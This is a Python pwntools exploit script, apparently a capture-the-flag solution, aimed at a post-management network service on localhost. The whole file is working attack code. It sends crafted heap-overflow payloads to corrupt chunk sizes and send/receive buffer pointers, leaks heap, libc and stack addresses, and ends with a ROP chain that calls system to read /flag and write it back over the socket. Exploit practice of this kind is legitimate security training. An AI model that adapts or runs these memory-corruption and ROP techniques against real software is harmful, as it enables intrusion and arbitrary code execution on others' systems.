from pwn import *

# context.log_level = 'debug'

HOST = "localhost"
PORT = 8888


def create_post(io, content1, content2, content3, content4, content5):
    param1 = content1 + b"/../" + content2 + b"/../" + content3

    payload = p8(0x01)
    payload += p16(len(param1)) + param1
    payload += p16(len(content4)) + content4
    payload += p16(len(content5)) + content5
    io.send(payload)
    response = io.recvline()
    # print(response.decode())
    return response


def delete_post(io, post_id):
    id_str = post_id

    payload = p8(0x02)
    payload += p16(len(id_str)) + id_str
    io.send(payload)
    response = io.recvline()
    # print(response.decode())
    return response


def modify_post(io, post_id, new_content):
    id_str = post_id

    payload = p8(0x05)
    payload += p16(len(id_str)) + id_str
    payload += p16(len(new_content)) + new_content

    io.send(payload)
    response = io.recvline()
    # print(response.decode())
    return response


def pad(io, size):
    io.sendline(cyclic(size))
    response = io.recvline()
    # print(response.decode())


io = remote(HOST, PORT)
pad(io, 0x300)
pad(io, 0x600)
io.recv()
io.recv()
create_post(io, b"a" * 0x310, b"b", b"c", b"d", b"e" * 0x4C7)  # 1

payload = b"d" + p64(0x201)  # slpdsocket
payload = payload.ljust(0x160, b"\x00")
create_post(io, b"a", b"b", b"c" * (0x17 - 2), payload, b"e" * 0x27)  # 2
payload = b"d" + p64(0x211)  # sendbuf
payload = payload.ljust(0x160, b"\x00")
create_post(io, b"a", b"b", b"c" * (0x17 - 2), payload, b"e" * 0x310)  # 3
payload = b"d" + p64(0x221)  # recvbuf
payload = payload.ljust(0x160, b"\x00")
create_post(io, b"a", b"b", b"c" * (0x17 - 2), payload, b"e" * 0x310)  # 4

create_post(io, b"a" * 0x500, b"b", b"c", b"d", b"e")  # 5

delete_post(io, b"2" + b"\x00" * 120)
delete_post(io, b"3" + b"\x00" * 120)
delete_post(io, b"4" + b"\x00" * 120)

io1 = remote(HOST, PORT)


# sendbuf leak heap_addr
for i in range(7):
    payload = b"a" * (0x178 - i)
    payload = payload.ljust(0x210 - 0x10, b"\x00")
    delete_post(io, payload)
payload = b"a" * 0x170 + p64(0x301)
payload = payload.ljust(0x210 - 0x10, b"\x00")
delete_post(io, payload)

# slpdsocket
payload = b"a" * 0x170 + p64(0x2)
payload = payload.ljust(0x200 - 0x10, b"\x00")
delete_post(io, payload)

io1.recvuntil(b"\x01\x03\x00\x00\x00\x00\x00\x00")
io1.recv(8)
heap_addr = u64(io1.recv(8)) + 0x878
print(f"heap_addr:{hex(heap_addr)}")
delete_post(io, b"5" + b"\x00" * 120)

# sendbuf leak libc_addr
payload = b"a" * 0x180 + p64(heap_addr + 0x8)
payload = payload.ljust(0x210 - 0x10, b"\x00")
delete_post(io, payload)
for i in range(4):
    payload = b"a" * (0x180 - 1 - i)
    payload = payload.ljust(0x210 - 0x10, b"\x00")
    delete_post(io, payload)
payload = b"a" * 0x178 + p64(heap_addr)
payload = payload.ljust(0x210 - 0x10, b"\x00")
delete_post(io, payload)
for i in range(6):
    payload = b"a" * (0x177 - i)
    payload = payload.ljust(0x210 - 0x10, b"\x00")
    delete_post(io, payload)
payload = b"a" * 0x170 + p64(0x301)
payload = payload.ljust(0x210 - 0x10, b"\x00")
delete_post(io, payload)

# slpdsocket
payload = b"a" * 0x170 + p64(0x2)
payload = payload.ljust(0x200 - 0x10, b"\x00")
delete_post(io, payload)

libc = ELF("./libc.so.6")
libc_addr = u64(io1.recv(8)) - 96 - 0x1E7AC0  # main_arena-offset
print(f"libc_addr:{hex(libc_addr)}")

# sendbuf leak stack_addr
environ = libc_addr + libc.sym["environ"]
payload = b"a" * 0x180 + p64(environ + 0x8)
payload = payload.ljust(0x210 - 0x10, b"\x00")
delete_post(io, payload)
for i in range(4):
    payload = b"a" * (0x180 - 1 - i)
    payload = payload.ljust(0x210 - 0x10, b"\x00")
    delete_post(io, payload)
payload = b"a" * 0x178 + p64(environ)
payload = payload.ljust(0x210 - 0x10, b"\x00")
delete_post(io, payload)
for i in range(6):
    payload = b"a" * (0x177 - i)
    payload = payload.ljust(0x210 - 0x10, b"\x00")
    delete_post(io, payload)
payload = b"a" * 0x170 + p64(0x301)
payload = payload.ljust(0x210 - 0x10, b"\x00")
delete_post(io, payload)

# slpdsocket
payload = b"a" * 0x170 + p64(0x2)
payload = payload.ljust(0x200 - 0x10, b"\x00")
delete_post(io, payload)

stack_addr = u64(io1.recv(8)) - 0x310  # handle_command_ret_Stack_addr
print(f"stack_addr:{hex(stack_addr)}")

# recvbuf hijack
payload = b"a" * 0x180 + p64(stack_addr + 0x100)
payload = payload.ljust(0x220 - 0x10, b"\x00")
delete_post(io, payload)
for i in range(4):
    payload = b"a" * (0x180 - 1 - i)
    payload = payload.ljust(0x220 - 0x10, b"\x00")
    delete_post(io, payload)
payload = b"a" * 0x178 + p64(stack_addr)
payload = payload.ljust(0x220 - 0x10, b"\x00")
delete_post(io, payload)
for i in range(6):
    payload = b"a" * (0x177 - i)
    payload = payload.ljust(0x220 - 0x10, b"\x00")
    delete_post(io, payload)
payload = b"a" * 0x170 + p64(0x301)
payload = payload.ljust(0x220 - 0x10, b"\x00")
delete_post(io, payload)

system = libc_addr + libc.sym["system"]
rdi = libc_addr + next(libc.search(asm("pop rdi ; ret", arch="amd64")))
payload = p64(rdi) + p64(stack_addr + 0x20) + p64(rdi + 1) + p64(system)
payload += b"cat /flag >& 5\x00"
io1.sendline(payload)


io1.interactive()
